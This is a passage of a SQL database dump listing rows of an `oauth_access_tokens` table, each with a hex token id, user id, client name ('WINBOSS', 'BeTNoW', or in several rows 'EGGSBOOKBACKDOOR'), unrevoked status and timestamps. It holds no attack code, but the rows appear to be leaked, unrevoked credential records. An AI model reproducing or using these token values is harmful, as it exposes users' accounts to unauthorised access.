('298476287f91b520eab5433d2171d9560f2c300701ca123b300f1f5fa5aa7491eb511948c5fe4181', '989330', 5, 'WINBOSS', '[]', 0, '2023-04-13 20:21:45', '2023-04-13 20:21:45', '2024-04-13 20:21:45'),
('298627d92ed3d4aa9459502106b973b640d809b3014d11af0713ffa8c494d75b0bd1fba95a8e88ff', '119491', 5, 'WINBOSS', '[]', 0, '2023-01-19 16:37:49', '2023-01-19 16:37:49', '2024-01-19 16:37:49'),
('29cca0e35c4b3ee17c5b629c1bc3b9299a66d1e4605f0cad3b28e44c175b1254197e5288089ee7f0', '479806', 5, 'WINBOSS', '[]', 0, '2023-09-22 13:44:42', '2023-09-22 13:44:42', '2024-09-22 13:44:42'),
('29d29a2d2f7fb4f9d3485125bccff1450cf145684d934aef59c7dd191a702883484333a7d3056c44', '764198', 5, 'WINBOSS', '[]', 0, '2023-04-19 11:36:37', '2023-04-19 11:36:37', '2024-04-19 11:36:37'),
('29d6744ba2c445cd213b53f4750dcba96799c290de0210ab8dc30ecca433a44ddc008bd402c7fdc4', '533782', 5, 'WINBOSS', '[]', 0, '2023-05-31 05:45:28', '2023-05-31 05:45:28', '2024-05-31 05:45:28'),
('2a01c79955e908e7577d4383fb9a60b30e60204b98688ff8bc95e9d0c8e148d92dbf64af978458c0', '950760', 5, 'WINBOSS', '[]', 0, '2023-01-19 16:29:24', '2023-01-19 16:29:24', '2024-01-19 16:29:24'),
('2a0eedd926cff63be86be4c69ce31da23e074616527dba9275ce0ed4914a38719baa6f5086372e4e', '681615', 5, 'WINBOSS', '[]', 0, '2023-07-14 14:42:18', '2023-07-14 14:42:18', '2024-07-14 14:42:18'),
('2a44b78b3f3b2c1a7fdb56623308bd7998a6f70cb4bb4641d448b2c0e71fd42ae57532194273a97e', '640542', 5, 'BeTNoW', '[]', 0, '2022-07-01 10:58:49', '2022-07-01 10:58:49', '2023-07-01 10:58:49'),
('2a51166e41c0c97724105ab7722a2748a00fbeae0edabc78af3cc3ad99e4eed213d3bcc9752814d0', '839487', 5, 'WINBOSS', '[]', 0, '2023-11-13 13:53:52', '2023-11-13 13:53:52', '2024-11-13 13:53:52'),
('2a61e83a7e1c0b226ece6e51b6b91315211280edf72700a336f285b236fc689e6e7bb263991fe582', '691571', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2022-11-24 07:47:29', '2022-11-24 07:47:29', '2023-11-24 07:47:29'),
('2adf178f34dc4d8201b741bea1413befe7d1f9e13bc77209ff3c38b4d1bdf6cb9fc6ca90bac4e752', '903169', 5, 'WINBOSS', '[]', 0, '2022-12-25 22:17:04', '2022-12-25 22:17:04', '2023-12-25 22:17:04'),
('2b3a557eeca374a8b4f7fbbcdcf273075a08f5fa2e5bfc080c5f2ad6163e277aa7382714ff740cee', '541136', 5, 'WINBOSS', '[]', 0, '2023-01-13 05:53:24', '2023-01-13 05:53:24', '2024-01-13 05:53:24'),
('2b44c6d2f111c9ca13f2c7209578b8537095ea55b38e3ef457515d89bd1f20604903fe0daadf12f5', '458205', 5, 'WINBOSS', '[]', 0, '2023-11-10 04:18:36', '2023-11-10 04:18:36', '2024-11-10 04:18:36'),
('2b6feec2501738842ec5bddc5e5256c4bdf75ceecfc127e7f775d10f07d141ee68cf62b179870c44', '372469', 5, 'WINBOSS', '[]', 0, '2022-08-22 12:09:43', '2022-08-22 12:09:43', '2023-08-22 12:09:43'),
('2c5a287ed073fe8a0116e2b5b0d7106ff5422ddc27283ab0b97d71ca5c7ffea5c728e9dc96aa0b01', '680766', 5, 'WINBOSS', '[]', 0, '2023-12-27 04:00:06', '2023-12-27 04:00:06', '2024-12-27 04:00:06'),
('2c648d9f028ef978ca29cbc72fe910e9511bc993872584768eb25823221e8496a74f76719f9c687b', '981504', 5, 'WINBOSS', '[]', 0, '2022-12-27 17:08:03', '2022-12-27 17:08:03', '2023-12-27 17:08:03'),
('2c7817e83ae8cd17582b463f4009d325f9bae9e3062fbf89c4377610b77a3013ddff5ca7e713d468', '312385', 5, 'WINBOSS', '[]', 0, '2023-11-25 21:45:41', '2023-11-25 21:45:41', '2024-11-25 21:45:41'),
('2cd847e75a6bccd388223a9ed25ee5167d0082bed6846db84c0b06f75644710dfbc000b59a8a6730', '418594', 5, 'WINBOSS', '[]', 0, '2022-12-30 22:21:12', '2022-12-30 22:21:12', '2023-12-30 22:21:12'),
('2cfde18fead83a0ae819a590e82b6099d7fe714ec15376bb778cba4cd3c43ca5c8a6b27b91edee8f', '504409', 5, 'WINBOSS', '[]', 0, '2022-12-27 02:31:50', '2022-12-27 02:31:50', '2023-12-27 02:31:50'),
('2d171a5693197d96cbbe5e9a2c6e58bcf99ae78c1f729f56a45df821f4577b009d5e4842bb292fd0', '251877', 5, 'WINBOSS', '[]', 0, '2023-04-24 05:29:28', '2023-04-24 05:29:28', '2024-04-24 05:29:28'),
('2d3c0045e34dc82d65dcd02e3819e9131c052e4e0e5d15be1f0c9f13e199c52dba472e05bc60e1ea', '365346', 5, 'WINBOSS', '[]', 0, '2023-04-10 13:28:24', '2023-04-10 13:28:24', '2024-04-10 13:28:24'),
('2d50fe0db704bd3d0a532ccc0f3fa613b33fd4cc4ec8b317f8d3f5dc8264282de160422110638f7c', '431493', 5, 'WINBOSS', '[]', 0, '2022-12-07 14:30:14', '2022-12-07 14:30:14', '2023-12-07 14:30:14'),
('2d88dc01bab1017eff0857a69d55d184f836956bd6b3aee554c0038c38a6fbef315b612d73b40fe6', '239134', 5, 'WINBOSS', '[]', 0, '2023-07-09 05:41:27', '2023-07-09 05:41:27', '2024-07-09 05:41:27'),
('2de7d54457329f89735b0ee715a3901dcae06750aeaa65460b865bcaac7360511c30389d9df55f4e', '317168', 5, 'WINBOSS', '[]', 0, '2023-12-22 14:39:17', '2023-12-22 14:39:17', '2024-12-22 14:39:17'),
('2e063716d09e1f3f24dc93a04042b0e208a963b7e4ef642e334e663efe8d9724984d32ffe43038fa', '774215', 5, 'WINBOSS', '[]', 0, '2024-01-19 00:49:52', '2024-01-19 00:49:52', '2025-01-19 00:49:52'),
('2e18e1d1bb5689da2229e8437e4c0c1cd684e77c9fe17a21535f57fa86eb2e5a172c15c62589594b', '919895', 5, 'WINBOSS', '[]', 0, '2022-12-07 15:00:38', '2022-12-07 15:00:38', '2023-12-07 15:00:38'),
('2f178207d7339c9a325c96d26ae5fdb526fe9855426ad187cbd1a5fabb3d3151e0984704ac4865cf', '756905', 5, 'WINBOSS', '[]', 0, '2023-12-04 17:13:53', '2023-12-04 17:13:53', '2024-12-04 17:13:53'),
('2f23d329e778aec1280712c08628b59a69d2d1c42bfc3074a8604881f4bbff3fd5083be43d4121c0', '759644', 5, 'WINBOSS', '[]', 0, '2023-06-22 02:57:35', '2023-06-22 02:57:35', '2024-06-22 02:57:35'),
('2f61fecbc626b12db999fd88b2360ae478b53f56a4d696cd594a5e55db3a2d17d6c7af3c550f57d5', '989405', 5, 'WINBOSS', '[]', 0, '2023-05-19 09:22:27', '2023-05-19 09:22:27', '2024-05-19 09:22:27'),
('2f84ddf1391c5a67e463418f639acc1723b83493ebdec016821ea16bc87b8e53aa44c6f050a7e211', '139848', 5, 'WINBOSS', '[]', 0, '2023-12-30 03:37:38', '2023-12-30 03:37:38', '2024-12-30 03:37:38'),
('2f98ff084c23e60933a4599a69587628bda8bdd30a2b7f60f0cd403730b8edc98706a8bb40ea1c38', '728333', 5, 'WINBOSS', '[]', 0, '2023-04-25 11:42:44', '2023-04-25 11:42:44', '2024-04-25 11:42:44'),
('2fc60e783021c6497a8b9c17f30d62eadce825912de189f8624b6dfc954d0cca7d6a5880dcae1295', '930834', 5, 'WINBOSS', '[]', 0, '2023-01-22 16:11:17', '2023-01-22 16:11:17', '2024-01-22 16:11:17'),
('301776e3f4dcff4f95a38b268d7f9cd3989ed5b8cd472afa0efb41b76477c44ecde73c2353f1768b', '286486', 5, 'WINBOSS', '[]', 0, '2024-01-20 08:45:12', '2024-01-20 08:45:12', '2025-01-20 08:45:12'),
('301e56aaf92f0327eaa7029442c740230eb950dc094e4a1923d2d7fc491ac56b5d599f410895dd9d', '683321', 5, 'WINBOSS', '[]', 0, '2023-08-08 16:32:27', '2023-08-08 16:32:27', '2024-08-08 16:32:27'),
('307caed0558a68094e8c6e2db0578e4563244e05efdfe374c1a1e4cc660ba14d44207ddb18398a2c', '696869', 5, 'WINBOSS', '[]', 0, '2023-08-15 09:01:56', '2023-08-15 09:01:56', '2024-08-15 09:01:56'),
('30db82127a607ea8c7f85e77d1999fd0a729b6c2bb1473be49d170394b8288e8b7320b39e127d55a', '674276', 5, 'WINBOSS', '[]', 0, '2023-11-13 17:15:50', '2023-11-13 17:15:50', '2024-11-13 17:15:50'),
('312a394445dba318aa7a1b8cb7129ebf563e48a9812cbb8517ecc3b07199a6828a5dbf9636147bf0', '394557', 5, 'WINBOSS', '[]', 0, '2022-12-27 18:29:36', '2022-12-27 18:29:36', '2023-12-27 18:29:36'),
('3144402cc83e421f4dee5931379df1b184929e195ee8ef2b3c85fb092790d4ef2bea16c0d376c2a3', '494634', 5, 'WINBOSS', '[]', 0, '2022-11-18 01:56:32', '2022-11-18 01:56:32', '2023-11-18 01:56:32'),
('3176f40e109fdbaf2b9028fdf8af8e0e1698914482dc0986b1761f0a96de4a621d75e80f0ef6b6b1', '580615', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2023-11-08 04:16:18', '2023-11-08 04:16:18', '2024-11-08 04:16:18'),
('317d7c7e7436b9ab42a4613c38ff754d20158e02dfcb46cc6587d069f23a44d85060e577400f9008', '945726', 5, 'WINBOSS', '[]', 0, '2022-06-28 08:23:57', '2022-06-28 08:23:57', '2023-06-28 08:23:57'),
('3188730c2cf86972ac79cfb77d4bab6634bea4b6299c6801dd058de515b80d90a3380546a0894a38', '100853', 5, 'WINBOSS', '[]', 0, '2022-09-28 12:01:18', '2022-09-28 12:01:18', '2023-09-28 12:01:18'),
('318c52e1dba5c8dc64efa844cbc7f919fdc9ab135b13aff09dda742573529e4d4114a98d907af23b', '951320', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2023-12-24 05:41:18', '2023-12-24 05:41:18', '2024-12-24 05:41:18');
INSERT INTO `oauth_access_tokens` (`id`, `user_id`, `client_id`, `name`, `scopes`, `revoked`, `created_at`, `updated_at`, `expires_at`) VALUES
('31c5934663563eb9bdf585cb7ee12c602263c08738a6d12f2778964502d171b749aa1a99320ebd12', '858214', 5, 'WINBOSS', '[]', 0, '2022-08-06 04:43:35', '2022-08-06 04:43:35', '2023-08-06 04:43:35'),
('31d1f01c9d931b7b8ad439dd8ae298e23709dd9cabbcc2659cdaff642e4ea0d05f00d3d5ed76b5dd', '943601', 5, 'WINBOSS', '[]', 0, '2023-06-30 07:03:54', '2023-06-30 07:03:54', '2024-06-30 07:03:54'),
('31f80cca0620f930d505ca445e6eef7d66a060abf2007ce51ee63a7dbb57764f628791a486598787', '603403', 5, 'WINBOSS', '[]', 0, '2023-05-10 07:30:24', '2023-05-10 07:30:24', '2024-05-10 07:30:24'),
('31fd123e20c13762ed5b12db739abde93c2187d9b5324d4fca8840b8d0dcb1de31acdd6d91d6d756', '705558', 5, 'WINBOSS', '[]', 0, '2023-01-21 15:09:53', '2023-01-21 15:09:53', '2024-01-21 15:09:53'),
('3207a476b7d1bb1d2e2623898f73edc99f37aa75474aa81541a16a3c796e6ca2ee4cb9495f9f2a9a', '332953', 5, 'WINBOSS', '[]', 0, '2023-10-26 21:12:54', '2023-10-26 21:12:54', '2024-10-26 21:12:54'),
('3209c5a38a251ee942ffe3b9b285b5b9fc1cace61ffcab568c4bdaf0fd121111cc1d49906ef47e02', '761192', 5, 'WINBOSS', '[]', 0, '2022-06-28 08:12:53', '2022-06-28 08:12:53', '2023-06-28 08:12:53'),
('3215b9a99dfdbdd2e8a32b08ed1386a743cc2c7324bb3edc2adf996fef566ad954c568f1740d4c5b', '535245', 5, 'WINBOSS', '[]', 0, '2023-08-25 09:31:50', '2023-08-25 09:31:50', '2024-08-25 09:31:50'),
('3226e0b098777a8f8ae779262e646c519717f762f24b48c51ad0c707c65814d0a16a085b3d125e96', '387170', 5, 'WINBOSS', '[]', 0, '2022-12-11 05:34:15', '2022-12-11 05:34:15', '2023-12-11 05:34:15'),
('3235c22ebaa1d745b83c443381cefbaa6b8f005aa121bebd5cfab195d0ffb9a6f249d0bcdbd76eaa', '785332', 5, 'WINBOSS', '[]', 0, '2023-01-16 08:03:35', '2023-01-16 08:03:35', '2024-01-16 08:03:35'),
('323ff879dba74887f3d018255710b66c1eb5ab7e34bc04410c446988c5b895b1eb0eafdceffd9642', '434217', 5, 'WINBOSS', '[]', 0, '2023-10-29 10:51:59', '2023-10-29 10:51:59', '2024-10-29 10:51:59'),
('325908f20228d4e58ded8f7e54c1ad2da74d1612fc19a43c9dddb3a7779fe61635bb9789a66b4871', '350282', 5, 'WINBOSS', '[]', 0, '2023-09-03 16:51:23', '2023-09-03 16:51:23', '2024-09-03 16:51:23'),
('32cbf4c22e66e1f3fae204a9c06201d105ff58feab0dd0fd2992c300114d1ed1aaf0c0083908ca66', '150328', 5, 'WINBOSS', '[]', 0, '2022-12-20 04:11:25', '2022-12-20 04:11:25', '2023-12-20 04:11:25'),
('32f1e34c44f7a5aa39410161635a99cbc115dc8d28e1104d7f6ddc2f2f5661f12c283c688f2d3b80', '337368', 5, 'WINBOSS', '[]', 0, '2023-08-13 16:55:46', '2023-08-13 16:55:46', '2024-08-13 16:55:46'),
('333cae4855ba8b3a9e9f2c9c5c7a36c13960df7d181bd977a3213212cb753466a752c658b7361dcf', '457896', 5, 'WINBOSS', '[]', 0, '2022-06-28 08:27:43', '2022-06-28 08:27:43', '2023-06-28 08:27:43'),
('335d7b56e4d366ce640f5e0a55719dc632bc73347c78ed7e9da82631ee2c3e8184672884b155b60d', '601019', 5, 'WINBOSS', '[]', 0, '2022-06-30 15:07:24', '2022-06-30 15:07:24', '2023-06-30 15:07:24'),
('33b8dc9f78bf0c919bbd8bb27654b9d362c87310dba080907156c1f79ac8eb091b138ec942a6197b', '387254', 5, 'WINBOSS', '[]', 0, '2023-07-12 21:13:56', '2023-07-12 21:13:56', '2024-07-12 21:13:56'),
('33ce3b384c0a8058b645b6d70bfac3fc7d847bc562fa69b384d3e511d0cfe53101bc767f5127c17a', '825897', 5, 'WINBOSS', '[]', 0, '2022-12-08 07:50:38', '2022-12-08 07:50:38', '2023-12-08 07:50:38'),
('34074bfd2ca8922579fe6fe67abb6cd6b48b3f218aa3dfc8918273a3e65b590d9e74b3b996d58b00', '665991', 5, 'WINBOSS', '[]', 0, '2023-08-15 09:34:30', '2023-08-15 09:34:30', '2024-08-15 09:34:30'),
('345302cf695433b3c37f24945a7fcaff63f23b003fa3f723eeea465327a93f11c427cc5b185cb897', '953253', 5, 'WINBOSS', '[]', 0, '2022-11-04 09:03:00', '2022-11-04 09:03:00', '2023-11-04 09:03:00'),
('3454104ee8952346d55bdc01d041562d12a0a7d95c29652e75c493e9950ee1fd00418372b4e0e396', '938689', 5, 'WINBOSS', '[]', 0, '2023-02-01 15:49:36', '2023-02-01 15:49:36', '2024-02-01 15:49:36'),
('345986b057062e63af08731c01d70913b49c286657a7f62de5039aba098cdb9598c7952fe3e41f51', '746394', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2022-06-28 08:16:21', '2022-06-28 08:16:21', '2023-06-28 08:16:21'),
('3470ce7fc28823d852002211cac1c445cfdd8ebf2bcd861df4e315577176fef46b16b366289f785f', '580615', 5, 'WINBOSS', '[]', 0, '2023-10-15 16:13:50', '2023-10-15 16:13:50', '2024-10-15 16:13:50'),
('34a218b5760a1656aabd91f2e073523b166ee4677fa69ca7e933975c2cdb69d89287158615fd33aa', '487763', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2023-06-26 07:36:18', '2023-06-26 07:36:18', '2024-06-26 07:36:18'),
('34a33d9e968a96507ef8f343ec74b251838dede089c8a3c0c6c736e5269aba1d624756560b63f84b', '966127', 5, 'WINBOSS', '[]', 0, '2022-12-16 06:16:24', '2022-12-16 06:16:24', '2023-12-16 06:16:24'),
('34a40db688f461f6ef9dc2f4a9b62fbaa50fd46286e059c2594912f5d3cb6348a1f8af5845ed50a6', '892897', 5, 'WINBOSS', '[]', 0, '2024-01-02 05:11:55', '2024-01-02 05:11:55', '2025-01-02 05:11:55'),
('34b3d4a64e4cca3f699a3a062b964e4be695a688d5ebc3f3655867ed81ae54e4aaf28253c4d87a1c', '180977', 5, 'WINBOSS', '[]', 0, '2023-12-07 08:21:51', '2023-12-07 08:21:51', '2024-12-07 08:21:51'),
('34e71e31742a2f1dff7664735f356c49deeae5bc687291a4c8901a5fd78f922b0668d868eced35ed', '759525', 5, 'WINBOSS', '[]', 0, '2023-02-20 15:39:05', '2023-02-20 15:39:05', '2024-02-20 15:39:05'),
('34f1fafdba91910f8fa7e0c3a4768152e264ebf495816966a99a8390d0f6b7a7e81fccbf635a2627', '159466', 5, 'WINBOSS', '[]', 0, '2023-04-04 08:53:58', '2023-04-04 08:53:58', '2024-04-04 08:53:58'),
('3535b2262f60fecfc5265396a88f9d7be5b6f156578a63bc1321bf5c225b1817e3646ea5b05afa23', '765901', 5, 'WINBOSS', '[]', 0, '2023-07-09 05:41:05', '2023-07-09 05:41:05', '2024-07-09 05:41:05'),
('3535cfc669a33f33c8e269a438ba0ecd2dd8ce6e46a823938a3f2ca49545e9ebff3d535bf44d64c7', '832278', 5, 'WINBOSS', '[]', 0, '2023-05-25 15:13:50', '2023-05-25 15:13:50', '2024-05-25 15:13:50'),
('3572365d3ba680c2bc55510a6ccb322063c58ad707408239bd783a73b2166eca45ed72ff045d8d9c', '702841', 5, 'WINBOSS', '[]', 0, '2022-10-05 18:44:08', '2022-10-05 18:44:08', '2023-10-05 18:44:08'),
('3579cd66a20ed689d0ad080ae1bb054291f01d1d2fc86539209590fd10419c684bb9fb8bb18bd326', '712161', 5, 'WINBOSS', '[]', 0, '2023-01-13 10:51:42', '2023-01-13 10:51:42', '2024-01-13 10:51:42'),
('3580292d4090e4170007f0291f0d9808ef689e032ca3a1eb0c90f31188c793019c119d64fe12d0da', '319435', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2022-09-01 05:10:08', '2022-09-01 05:10:08', '2023-09-01 05:10:08'),
('35a917f23ba2f7226556a97eb556f764060adefe05685ade6184501a75e82e52049d0cc8c3030fc7', '900475', 5, 'WINBOSS', '[]', 0, '2022-12-30 21:56:22', '2022-12-30 21:56:22', '2023-12-30 21:56:22'),
('35c101d0aee56e2e9a581659250050ffdcfc5b8cafbbee893e9624dc9a161ee0661c2f1fed98bac3', '512138', 5, 'WINBOSS', '[]', 0, '2023-05-31 05:43:25', '2023-05-31 05:43:25', '2024-05-31 05:43:25'),
('35f65adbad4582b880b690b02d55529f6c5525a213481b624235870ce9c69fb7d06f5eb0c4fb1387', '483842', 5, 'WINBOSS', '[]', 0, '2022-12-28 12:05:56', '2022-12-28 12:05:56', '2023-12-28 12:05:56'),
('3605517c87a7b45fc55a37be97fba2e06daed8cfaeb429a2a005a6d484f37fbc6eeb83646713bddd', '936766', 5, 'WINBOSS', '[]', 0, '2022-12-08 08:13:08', '2022-12-08 08:13:08', '2023-12-08 08:13:08'),
('3617d91dd383a1ae6304f73cfb93a59d85fc64651f6d300bd9e7663e941e2c04297997872c82dd2a', '174794', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2022-11-21 10:27:56', '2022-11-21 10:27:56', '2023-11-21 10:27:56'),
('36c116d6831f395ca9b4f1b6159dd566240050e91f1fc19c325f2ec3829613ffebe057bc5e5753bd', '913220', 5, 'WINBOSS', '[]', 0, '2023-04-18 04:30:03', '2023-04-18 04:30:03', '2024-04-18 04:30:03'),
('3723e583557f2bd3544f91f4ab193d4fb55e540f79aab7ec421a0a4240d1bc776370a3f4f0a38f83', '799676', 5, 'WINBOSS', '[]', 0, '2022-12-19 01:14:03', '2022-12-19 01:14:03', '2023-12-19 01:14:03'),
('372a80c79d4459db50146060373a3a00ae00fb5887a0873bcd19100c6c032d10887c1fe1b4451033', '518269', 5, 'WINBOSS', '[]', 0, '2023-03-09 02:41:29', '2023-03-09 02:41:29', '2024-03-09 02:41:29'),
('372d8d80484d6835f4710b9623c683bd8d92a9c815a6ddfc9759d06c99760b9dea18863b00ce306f', '177911', 5, 'WINBOSS', '[]', 0, '2022-06-28 08:18:11', '2022-06-28 08:18:11', '2023-06-28 08:18:11'),
('373496ec3e265f98a14285f7054c854d471fc42889e624d6f23523cd027ca93c778ac4349fafe030', '164909', 5, 'WINBOSS', '[]', 0, '2023-08-25 09:24:51', '2023-08-25 09:24:51', '2024-08-25 09:24:51'),
('3742e0a99189bdc1ca6909e81aa0ab25fe9e2ca37b7294c05dd7c4f58f7f473e8adf01aee3a04207', '300244', 5, 'WINBOSS', '[]', 0, '2022-12-17 10:38:15', '2022-12-17 10:38:15', '2023-12-17 10:38:15'),
('379562594d8aa859ccd50c8a9239647f5f73683764f45ca382e5fea5d66ccf674a92ed4c7fd4040b', '851883', 5, 'WINBOSS', '[]', 0, '2022-10-05 18:43:07', '2022-10-05 18:43:07', '2023-10-05 18:43:07'),
('37c1a18b3425d6e6712269497d8db96e60b23eb617f011c1b93c800061df0144dcdc98f83fd1fcb4', '222454', 5, 'WINBOSS', '[]', 0, '2023-01-15 11:33:36', '2023-01-15 11:33:36', '2024-01-15 11:33:36'),
('37cba7d631550c86e5ca5c9c243ef0a8b4fbdf520ca0240838a79e6a41ddc841a9387fd7f9e1e211', '272405', 5, 'WINBOSS', '[]', 0, '2023-06-03 09:50:13', '2023-06-03 09:50:13', '2024-06-03 09:50:13'),
('37ccb090d9e77af2d346cac50ecd1dcf73187a8d3c009b3ba889be123b3dfce4a0bac9054b1f5332', '968298', 5, 'WINBOSS', '[]', 0, '2023-07-26 05:28:07', '2023-07-26 05:28:07', '2024-07-26 05:28:07'),
('37d0f991f7d53a83a43f2dd22bab417784789958ebf670bcb3822eccb54af5739398d12d980d251b', '709959', 5, 'WINBOSS', '[]', 0, '2022-07-24 12:53:44', '2022-07-24 12:53:44', '2023-07-24 12:53:44'),
('382e6b338c7343bd088babd3cb520c66b4fee00ca6c42a82db5f4e6e4dd8f6e839209c4cdb04792d', '914089', 5, 'WINBOSS', '[]', 0, '2024-01-17 03:31:12', '2024-01-17 03:31:12', '2025-01-17 03:31:12'),
('3832413561d43b66a9f2517ffc7d4f91c3a7d867ae29890ad7190910eef61c9f3967c66e7e65001f', '297327', 5, 'WINBOSS', '[]', 0, '2023-05-06 04:44:21', '2023-05-06 04:44:21', '2024-05-06 04:44:21'),
('3844775e872f3df4284482343aebbe0f314a4c66b74ebbfd6b392dd1c3a3f76f313e84be3324a1fa', '521375', 5, 'WINBOSS', '[]', 0, '2024-01-20 12:59:50', '2024-01-20 12:59:50', '2025-01-20 12:59:50'),
('385328b19025e1c35019d15222e49767d906c5c2c3163f346d25be2e974a8875a870307eaccf1d49', '429181', 5, 'WINBOSS', '[]', 0, '2023-06-02 03:56:57', '2023-06-02 03:56:57', '2024-06-02 03:56:57'),
('3859451d01f6d4c6d2e858cf338316d1c09515328964d0cef2772207ab8a75fdd983152d874c4ff6', '795762', 5, 'WINBOSS', '[]', 0, '2023-01-16 08:21:55', '2023-01-16 08:21:55', '2024-01-16 08:21:55'),
('385edeeb016987ba5868f0c0d879c1a670bcc530663ebd74b40ceea97fdc1d7bf2e108e685425cb8', '704758', 5, 'WINBOSS', '[]', 0, '2023-06-17 19:06:31', '2023-06-17 19:06:31', '2024-06-17 19:06:31'),
('38a2d4b849892391eb4604779210ec623694780f2afec0bb5f2d5ab3b8b4721d041dbf868833a61c', '350034', 5, 'WINBOSS', '[]', 0, '2022-12-15 11:02:18', '2022-12-15 11:02:18', '2023-12-15 11:02:18'),
('38cc25429a081fdda2433d4d40aa95a7f37d461067f87700ffe2c2ae6ae785c00d9dd7b10592909e', '123123', 5, 'WINBOSS', '[]', 0, '2024-01-14 07:01:15', '2024-01-14 07:01:15', '2025-01-14 07:01:15'),
('3955c3baa93c1a492122441b4aa03dda0d310a2ed176ca17986e78453ec14bcc63d8297181dced85', '450127', 5, 'WINBOSS', '[]', 0, '2023-02-19 15:39:00', '2023-02-19 15:39:00', '2024-02-19 15:39:00'),
('3987d19d0fc61653338919d7056ef414afdca14b49862061a5e3745158fbb2f308cd0f106ba9a0ad', '842931', 5, 'WINBOSS', '[]', 0, '2023-04-01 10:51:39', '2023-04-01 10:51:39', '2024-04-01 10:51:39'),
('3997f9f492e760b1b5ad17e8ad47b334180047bf8d60c46ca4bf1719bef55fe91f26359c9dcb0610', '630373', 5, 'WINBOSS', '[]', 0, '2022-12-27 17:32:33', '2022-12-27 17:32:33', '2023-12-27 17:32:33'),
('39ba516e4833d71e1f17fd384aebd1922c09f3c9aeb2e687f1a9b877fe54db7ed2ffb6964a5c77c5', '529932', 5, 'WINBOSS', '[]', 0, '2022-11-02 04:28:15', '2022-11-02 04:28:15', '2023-11-02 04:28:15'),
('39ce098af90ae0c98dd37c4e605b2a56514734c7f44b0be3bd98f33b9d3fc26c4e711eeb3cecf169', '635862', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2023-12-30 06:29:39', '2023-12-30 06:29:39', '2024-12-30 06:29:39'),
('39e5cac75e50b110fd53b6d833a64b22c815aeadb71456407c66d426d89e67647f5085ce69dda835', '706382', 5, 'WINBOSS', '[]', 0, '2022-09-15 18:23:49', '2022-09-15 18:23:49', '2023-09-15 18:23:49'),
('3a0d188b582362f6d25fec490c2a084fe6ad7861595195825ca0c47cdefab2c090c19996ea02fccc', '655824', 5, 'WINBOSS', '[]', 0, '2023-10-21 12:16:06', '2023-10-21 12:16:06', '2024-10-21 12:16:06'),
('3aa71d287ed4e0358b5b8bd5b2af08bc283e588f89afb5874b8bbba860a4bbb5e6ca2f88e5e2c81f', '951320', 5, 'WINBOSS', '[]', 0, '2023-12-24 05:36:39', '2023-12-24 05:36:39', '2024-12-24 05:36:39'),
('3b4a52c7f35a97fd8be8a75ffe73ccea1de8aac4ddf17496759e6bec8650a911792b907f2048b72f', '901018', 5, 'WINBOSS', '[]', 0, '2023-03-14 03:43:04', '2023-03-14 03:43:04', '2024-03-14 03:43:04'),
('3b8de456e8d51ade6f84c716f8f3e5d84d3567ae4807c731992a167c0aff4364fdee947e868969a9', '111775', 5, 'WINBOSS', '[]', 0, '2024-01-03 08:17:20', '2024-01-03 08:17:20', '2025-01-03 08:17:20'),
('3b9bb6e4613bd5bf61e01f7ec676db55cc0b2b7dc1b4348c6330b427ec48e69f97a3412de21a564e', '644271', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2023-04-12 10:03:37', '2023-04-12 10:03:37', '2024-04-12 10:03:37'),
('3ba231f1d7bf37ed473e959e9ade78ad1ebea49cb847a3dc6132c5568d7a7aaa8fd5a1bdfa19da6a', '247106', 5, 'WINBOSS', '[]', 0, '2023-04-24 05:30:48', '2023-04-24 05:30:48', '2024-04-24 05:30:48'),
('3bba9440b9b756604536c1fa5ae2e897387526699d9ea0a321458b35a73d2dd679fb43d90d75ba38', '352507', 5, 'WINBOSS', '[]', 0, '2023-08-14 07:28:15', '2023-08-14 07:28:15', '2024-08-14 07:28:15'),
('3c1845cb5eeb9aabfb0b1c3af99e495c078fae59b25dfc406b40644bb32a95b2aa4d5c6b54c79efd', '931219', 5, 'WINBOSS', '[]', 0, '2022-12-25 22:19:06', '2022-12-25 22:19:06', '2023-12-25 22:19:06'),
('3c757619982c458170b2ef0c332cda9156d354ba21cebfa2a91f01a173a9d65f2d9dc5c09f6ad673', '308551', 5, 'WINBOSS', '[]', 0, '2022-12-19 04:07:32', '2022-12-19 04:07:32', '2023-12-19 04:07:32'),
('3c8ddc6f943b939eeac9edacea07c7e5da42f94eb59056f20cd987428d7c262dd02c48690b679f7c', '674438', 5, 'WINBOSS', '[]', 0, '2022-08-20 01:26:43', '2022-08-20 01:26:43', '2023-08-20 01:26:43'),
('3cb95d26a745e17a8db9898911e0eaab110d553e51742d19b6876bdbe045c6fedf905822d05b1b3f', '831191', 5, 'WINBOSS', '[]', 0, '2022-12-25 21:03:53', '2022-12-25 21:03:53', '2023-12-25 21:03:53'),
('3cda35d56b63ecc7bac8608b4929701f08417646cbe5939a195116c486ca13bd5b96a6e00ab935ae', '453798', 5, 'BeTNoW', '[]', 0, '2023-02-08 21:25:35', '2023-02-08 21:25:35', '2024-02-08 21:25:35'),
('3cdec95068da308d486278fe0d5076c97d1efe673faae48453dffdb1de793ca272dcab17a7ae9afc', '951320', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2023-12-25 09:29:48', '2023-12-25 09:29:48', '2024-12-25 09:29:48'),
('3d613edf7e6bd5b762618c540bc65af36f34a752d4c3d0374b1c63a6f1880f58f5cec97fe0ead804', '341630', 5, 'WINBOSS', '[]', 0, '2023-01-16 08:06:10', '2023-01-16 08:06:10', '2024-01-16 08:06:10'),
('3dd608a95a67e4fa402340f8b027e21a005361c30a0f8e92039f01c5d0a766f2b9c1aba0de69eca6', '875649', 5, 'WINBOSS', '[]', 0, '2022-12-25 22:57:16', '2022-12-25 22:57:16', '2023-12-25 22:57:16'),
('3def6b271b0fd53e435bafe7c5b35b1e8a850b6cbcc2fcf652dfcdb95ee6d7fc24110ea3e85c891b', '509499', 5, 'WINBOSS', '[]', 0, '2022-09-30 16:55:17', '2022-09-30 16:55:17', '2023-09-30 16:55:17'),
('3df4575e54c108ed031d83e92ba33bf87b3d929be228e2effd29ca06b62181e1cdb9f9a561940dd8', '825346', 5, 'WINBOSS', '[]', 0, '2023-07-20 05:09:36', '2023-07-20 05:09:36', '2024-07-20 05:09:36'),
